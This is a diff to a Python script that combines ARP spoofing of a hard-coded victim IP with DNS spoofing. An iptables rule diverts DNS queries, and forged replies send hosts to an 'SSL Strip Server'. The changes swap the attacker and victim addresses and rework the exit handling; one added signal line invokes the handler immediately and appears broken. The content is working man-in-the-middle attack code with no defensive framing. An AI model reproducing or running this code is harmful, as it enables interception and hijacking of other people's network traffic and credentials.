@@ -13,7 +13,7 @@ from scapy.layers.inet import IP, UDP
 
 import atexit
 
-localIP = '192.168.1.74'  # SSL Strip Server Address
+StripServer_IP = '192.168.0.6'  # SSL Strip Server Address
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
@@ -38,7 +38,7 @@ def callback(data):
                 an=DNSRR(
                     rrname=host,
                     ttl=10,
-                    rdata=localIP
+                    rdata=StripServer_IP
                 )
             )
         print "Spoof %s to me!" % host
@@ -55,15 +55,14 @@ def exit_handler(queue, process):
     queue.unbind()
     process.join()  # Escape ARP loop
     cleaner()
+    print("Successfully")
 
 
 def main():
     q = NetfilterQueue()
     q.bind(1, callback)
 
-    signal.signal(signal.SIGTERM, cleaner)
-
-    victim_ip = '192.168.1.16'
+    victim_ip = '192.168.0.39'
 
     arp_process = Process(target=run_arp, args=(victim_ip,))
 
@@ -74,6 +73,7 @@ def main():
     except KeyboardInterrupt:
         exit_handler(q, arp_process)
 
+    signal.signal(signal.SIGTERM, exit_handler(q, arp_process))
     atexit.register(exit_handler)
 
 
